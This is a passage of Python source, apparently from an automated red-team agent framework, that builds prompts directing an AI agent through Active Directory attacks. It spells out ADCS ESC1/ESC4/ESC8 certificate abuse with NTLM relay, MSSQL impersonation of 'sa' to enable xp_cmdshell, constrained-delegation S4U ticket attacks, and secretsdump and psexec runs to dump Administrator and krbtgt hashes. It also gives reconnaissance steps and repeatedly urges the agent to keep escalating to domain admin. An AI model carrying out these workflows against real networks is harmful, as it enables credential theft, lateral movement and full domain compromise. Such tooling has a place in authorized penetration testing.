        )
        state_context = format_state_context(state, "exploit", current_target=target)
        return unconstrained_prompt + state_context

    # Special handling for ADCS ESC vulnerabilities
    vuln_type_lower = vuln_type.lower()
    if "esc1" in vuln_type_lower or "esc4" in vuln_type_lower or "esc8" in vuln_type_lower:
        ca_server = payload.get("ca_server", target)
        template = payload.get("template", "")
        domain = payload.get("domain", "")

        esc_prompt = (
            f"**ADCS {vuln_type.upper()} EXPLOITATION**\n\n"
            f"CA Server: {ca_server}\n"
            f"Template: {template}\n"
            f"Domain: {domain}\n"
            f"Task ID: {task.task_id}\n\n"
            "**STEP BUDGET: ~25 steps max. Work efficiently!**\n\n"
            "**HARD LIMITS:**\n"
            "- 'connection refused'/'timed out' → CA unreachable, STOP immediately\n"
            "- 'web enrollment' error → HTTP not available, call task_complete(failed)\n"
            "- Max 2 attempts per tool, then report failure\n\n"
            "**WORKFLOW:**\n"
        )
        if "esc1" in vuln_type_lower or "esc4" in vuln_type_lower:
            esc_prompt += (
                "1. certipy_req_esc1 to request certificate with alternate UPN\n"
                "2. certipy_auth to get NTLM hash from certificate\n"
                "3. Report hash immediately when obtained\n"
            )
        else:  # esc8
            esc_prompt += (
                "1. Start ntlmrelayx targeting the CA's web enrollment\n"
                "2. Coerce DC/target to authenticate to relay\n"
                "3. Relay captures cert → certipy_auth for hash\n"
            )
        esc_prompt += (
            "\n**ON FAILURE**: Call task_complete immediately with failure reason.\n"
            "Do NOT keep retrying if CA/web enrollment is unreachable."
        )
        state_context = format_state_context(state, "exploit", current_target=target)
        return esc_prompt + state_context

    # Default exploit prompt
    default_prompt = (
        base_prompt + "Execute the exploitation technique. Report credentials obtained.\n"
        "If you obtain credentials or hashes, include a JSON block:\n"
        "```json\n"
        '{"credential": {"username": "", "password": "", "domain": "", "is_admin": false}}\n'
        "```\n"
        "or\n"
        "```json\n"
        '{"hash": {"username": "", "hash_value": "", "hash_type": "NTLM", "domain": ""}}\n'
        "```"
    )
    state_context = format_state_context(state, "exploit", current_target=target)
    return default_prompt + state_context


def _generate_mssql_exploit_prompt(
    task: TaskMessage,
    payload: dict[str, Any],
    state: SharedRedTeamState | None,
    base_prompt: str,
    target: str,
) -> str:
    """Generate prompt for MSSQL exploit tasks."""
    available_creds = payload.get("available_credentials", [])
    creds_section = ""
    if available_creds:
        creds_section = "\n**AVAILABLE SQL CREDENTIALS (use these!):**\n"
        for cred in available_creds:
            is_sql = cred.get("is_sql_account", "False") == "True"
            marker = " [SQL SERVICE ACCOUNT]" if is_sql else ""
            creds_section += (
                f"- {cred.get('domain', '')}\\{cred.get('username', '')}: "
                f"{cred.get('password', '')}{marker}\n"
            )

    mssql_prompt = (
        base_prompt + "**MSSQL EXPLOITATION WORKFLOW (IMPERSONATION FIRST!):**\n\n"
        "**STEP 1: ENUMERATE IMPERSONATION RIGHTS (DO THIS FIRST!)**\n"
        "```\n"
        "mssql_enum_impersonation(\n"
        f"    target='{target}',\n"
        "    username=<USER>,\n"
        "    password=<PASS>,\n"
        "    domain=<DOMAIN>\n"
        ")\n"
        "```\n"
        "→ If you can impersonate 'sa', you have a DIRECT PATH to sysadmin!\n\n"
        "**STEP 2: IMPERSONATE SA (if available)**\n"
        "```\n"
        "mssql_impersonate(\n"
        f"    target='{target}',\n"
        "    username=<USER>,\n"
        "    password=<PASS>,\n"
        "    impersonate_user='sa',\n"
        "    query='SELECT SYSTEM_USER',\n"
        "    domain=<DOMAIN>\n"
        ")\n"
        "```\n"
        "→ Now you're sysadmin! Enable xp_cmdshell next.\n\n"
        "**STEP 3: ENABLE XP_CMDSHELL (as sysadmin)**\n"
        "```\n"
        "mssql_enable_xp_cmdshell(\n"
        f"    target='{target}',\n"
        "    username=<USER>,\n"
        "    password=<PASS>,\n"
        "    domain=<DOMAIN>\n"
        ")\n"
        "```\n\n"
        "**STEP 4: EXECUTE COMMANDS**\n"
        "```\n"
        "mssql_command(\n"
        f"    target='{target}',\n"
        "    username=<USER>,\n"
        "    password=<PASS>,\n"
        "    command='whoami /priv',\n"
        "    domain=<DOMAIN>\n"
        ")\n"
        "```\n"
        "→ Check for SeImpersonatePrivilege (potato attack potential)\n\n"
        "**STEP 5: ENUMERATE LINKED SERVERS**\n"
        "```\n"
        "mssql_enum_linked_servers(\n"
        f"    target='{target}',\n"
        "    username=<USER>,\n"
        "    password=<PASS>,\n"
        "    domain=<DOMAIN>\n"
        ")\n"
        "```\n"
        "→ Linked servers can pivot across domain/forest trusts!\n"
        + creds_section
        + "\n**CRITICAL NOTES:**\n"
        "- Try EACH credential above - SQL accepts Windows auth\n"
        "- Impersonation check is HIGHEST PRIORITY (fastest path to sysadmin)\n"
        "- If xp_cmdshell gives NETWORK SERVICE, you may need potato attack for SYSTEM\n"
        "- Linked servers enable cross-domain pivoting\n\n"
        "Report credentials obtained in JSON format:\n"
        "```json\n"
        '{"credential": {"username": "", "password": "", "domain": "", "is_admin": false}}\n'
        "```"
    )
    state_context = format_state_context(state, "exploit", current_target=target)
    return mssql_prompt + state_context


def _generate_constrained_delegation_prompt(
    task: TaskMessage,
    payload: dict[str, Any],
    state: SharedRedTeamState | None,
    target: str,
) -> str:
    """Generate prompt for constrained delegation exploit tasks."""
    account = payload.get("account") or payload.get("account_name") or target
    target_spn = payload.get("target_spn", "")
    domain = payload.get("domain", "")
    username = payload.get("username") or payload.get("account_name") or account
    password = payload.get("password", "")

    # Look up password from shared state if not in payload
    if not password and state:
        creds = getattr(state, "all_credentials", getattr(state, "credentials", []))
        for cred in creds:
            if cred.username.lower() == username.lower() and cred.password:
                password = cred.password
                break

    # Find the DC for this domain
    dc_ip = payload.get("dc_ip", "")

    # Extract target hostname from SPN for post-exploitation
    target_hostname = ""
    if "/" in target_spn:
        target_hostname = target_spn.split("/", 1)[1]

    # target contains the IP address from the task payload
    target_ip = payload.get("target_ip", target)

    delegation_prompt = (
        f"**CONSTRAINED DELEGATION EXPLOITATION**\n\n"
        f"Account with delegation: {account}\n"
        f"Target SPN: {target_spn}\n"
        f"Target Host: {target_hostname}\n"
        f"Target IP: {target_ip}\n"
        f"Domain: {domain}\n"
        f"Task ID: {task.task_id}\n\n"
        "**STEP 1: S4U ATTACK (Get Administrator ticket)**\n"
        "```\n"
        f"s4u_attack(\n"
        f"    target_spn='{target_spn}',\n"
        f"    impersonate='Administrator',\n"
        f"    domain='{domain}',\n"
        f"    username='{username}',\n"
        f"    password='{password}'"
    )
    if dc_ip:
        delegation_prompt += f",\n    dc_ip='{dc_ip}'"
    delegation_prompt += (
        "\n)\n"
        "```\n"
        "→ Look for: 'Saving ticket in <filename>.ccache'\n\n"
        "**STEP 2: USE TICKET WITH SECRETSDUMP_KERBEROS (IMMEDIATELY AFTER!)**\n"
        "```\n"
        f"secretsdump_kerberos(\n"
        f"    target='{target_hostname}',\n"
        f"    username='Administrator',\n"
        f"    domain='{domain}',\n"
        f"    ticket_path='<ccache_file_from_step_1>',\n"
        f"    target_ip='{target_ip}'"
    )
    if dc_ip:
        delegation_prompt += f",\n    dc_ip='{dc_ip}'"
    delegation_prompt += (
        "\n)\n"
        "```\n"
        "**IMPORTANT:** Replace <ccache_file_from_step_1> with actual .ccache path from s4u_attack output!\n"
        f"**IMPORTANT:** Always use target_ip='{target_ip}' to avoid DNS resolution issues!\n\n"
        "**STEP 3: ALTERNATIVE - PSEXEC_KERBEROS FOR SHELL**\n"
        "If secretsdump fails or you need a shell:\n"
        "```\n"
        f"psexec_kerberos(\n"
        f"    target='{target_hostname}',\n"
        f"    username='Administrator',\n"
        f"    domain='{domain}',\n"
        f"    ticket_path='<ccache_file_from_step_1>',\n"
        f"    command='cmd /c whoami && hostname',\n"
        f"    target_ip='{target_ip}'"
    )
    if dc_ip:
        delegation_prompt += f",\n    dc_ip='{dc_ip}'"
    delegation_prompt += (
        "\n)\n"
        "```\n\n"
        "**CRITICAL SUCCESS INDICATORS:**\n"
        "- If target is a DC: Look for krbtgt hash → DOMAIN ADMIN\n"
        "- If target is a DC: Look for Administrator hash → DOMAIN ADMIN\n"
        "- If target is a member server: SAM/LSA secrets for lateral movement\n\n"
        "**DO NOT STOP after getting the ticket!** The ticket is useless by itself.\n"
        "You MUST use it with secretsdump_kerberos or psexec_kerberos to achieve actual access.\n\n"
        "Report any hashes obtained:\n"
        "```json\n"
        '{"hash": {"username": "Administrator", "hash_value": "...", "hash_type": "NTLM", "domain": "..."}}\n'
        "```"
    )
    state_context = format_state_context(state, "exploit", current_target=target)
    return delegation_prompt + state_context


def _generate_privesc_enumeration_prompt(
    task: TaskMessage,
    payload: dict[str, Any],
    state: SharedRedTeamState | None,
) -> str:
    """Generate prompt for privilege escalation enumeration tasks."""
    domain = payload.get("domain", "")
    dc_ip = payload.get("dc_ip", "")
    username = payload.get("username", "")
    password = payload.get("password", "")
    techniques = payload.get("techniques", [])

    # Re-resolve DC IP using current state - the original dispatch may have used
    # stale data before host discovery completed
    if domain:
        dc_ip, dc_warning = resolve_dc_ip_for_domain(state, domain, dc_ip or "")
    else:
        dc_warning = None

    technique_instructions = []
    for i, technique in enumerate(techniques, 1):
        if technique == "find_delegation":
            technique_instructions.append(
                f"{i}. find_delegation(domain='{domain}', username='{username}', "
                f"password='{password}', dc_ip='{dc_ip}') - Find accounts with Kerberos delegation"
            )
        else:
            technique_instructions.append(f"{i}. {technique}(...)")

    dc_warning_line = f"⚠️ {dc_warning}\n" if dc_warning else ""

    base_prompt = (
        f"Run privilege escalation enumeration:\n"
        f"Domain: {domain}\n"
        f"DC IP: {dc_ip or 'N/A'}\n"
        f"{dc_warning_line}"
        f"Username: {username}\n"
        f"Password: {password}\n"
        f"Task ID: {task.task_id}\n\n"
        "**EXECUTE THESE ENUMERATION TECHNIQUES:**\n" + "\n".join(technique_instructions) + "\n\n"
        "**WORKFLOW:**\n"
        "1. Execute each enumeration technique\n"
        f"2. If CONSTRAINED DELEGATION is found for the current user ({username}):\n"
        "   a. Run s4u_attack to get Administrator ticket for the target SPN\n"
        "   b. If ticket obtained, IMMEDIATELY use it:\n"
        "      - Set KRB5CCNAME to the .ccache file path\n"
        f"      - Run secretsdump with -k -no-pass against the target DC to dump hashes\n"
        f"      - Example: secretsdump -k -no-pass -dc-ip {dc_ip} {domain}/Administrator@dc01.{domain}\n"
        "   c. Report the Administrator hash if obtained - THIS IS DOMAIN ADMIN!\n"
        "3. If UNCONSTRAINED DELEGATION is found, report it for coercion attack\n"
        "4. Mark task complete with findings\n\n"
        "**CRITICAL:** When you get an S4U ticket, you MUST use it immediately with secretsdump!\n"
        "The ticket is your key to Domain Admin - don't stop after getting it."
    )
    state_context = format_state_context(state, "privesc", current_target=dc_ip)
    return base_prompt + state_context


def _generate_recon_prompt(
    task: TaskMessage,
    payload: dict[str, Any],
    state: SharedRedTeamState | None,
) -> str:
    """Generate prompt for reconnaissance tasks (nmap, user enum, shares, etc.)."""
    techniques = payload.get("techniques", [])
    target_ips = payload.get("target_ips", [])
    domain = payload.get("domain", "")
    dc_ip = payload.get("dc_ip", "")
    username = payload.get("username", "")
    password = payload.get("password", "")
    hash_value = payload.get("hash_value", "")
    reason = payload.get("reason", "")

    # Build credential info
    cred_line = ""
    if username:
        if password:
            cred_line = f"Credentials: {domain}\\{username} / {password}\n"
        elif hash_value:
            cred_line = f"Credentials: {domain}\\{username} (hash: {hash_value})\n"
        else:
            cred_line = f"User context: {domain}\\{username}\n"

    # Build target info
    targets_str = ", ".join(target_ips[:10]) if target_ips else "N/A"
    if len(target_ips) > 10:
        targets_str += f" ... ({len(target_ips)} total)"

    # Build technique instructions
    technique_instructions = []
    for tech in techniques:
        if tech == "nmap_scan":
            technique_instructions.append(
                f"- **nmap_scan(target='{targets_str}')** - Scan for open ports and services"
            )
        elif tech == "enumerate_users":
            technique_instructions.append(
                f"- **enumerate_users(target='{dc_ip}', domain='{domain}')** - List domain users"
            )
        elif tech == "enumerate_shares":
            technique_instructions.append(
                f"- **enumerate_shares(target='{targets_str}')** - Find SMB shares"
            )
        elif tech == "run_bloodhound":
            technique_instructions.append(
                f"- **run_bloodhound(domain='{domain}', dc_ip='{dc_ip}')** - Collect AD data for path analysis"
            )
        elif tech == "smb_signing_check":
            technique_instructions.append(
                f"- **smb_signing_check(targets='{targets_str}')** - Find relay-able hosts"
            )
        else:
            technique_instructions.append(f"- **{tech}(...)**")

    techniques_section = (
        "\n".join(technique_instructions)
        if technique_instructions
        else "Execute appropriate reconnaissance for the task."
    )

    base_prompt = (
        f"**RECONNAISSANCE TASK**\n\n"
        f"Target IPs: {targets_str}\n"
        f"Domain: {domain or 'N/A'}\n"
        f"DC IP: {dc_ip or 'N/A'}\n"
        f"{cred_line}"
        f"Reason: {reason or 'general recon'}\n"
        f"Task ID: {task.task_id}\n\n"
        f"**EXECUTE THESE TECHNIQUES:**\n{techniques_section}\n\n"
        "**IMPORTANT:**\n"
        "- Parse and record ALL discovered information (hosts, services, users, shares)\n"
        "- The system will automatically extract discovered data from tool outputs\n"
        "- Report any vulnerabilities or interesting findings\n"
        "- Mark task complete when reconnaissance is finished\n"
    )

    state_context = format_state_context(
        state, "recon", current_target=target_ips[0] if target_ips else dc_ip
    )
    return base_prompt + state_context


__all__ = [
    "TASK_PROMPTS",
    "_is_pass_the_hash_compatible",
    "format_state_context",
    "generate_prompt_from_task",
]
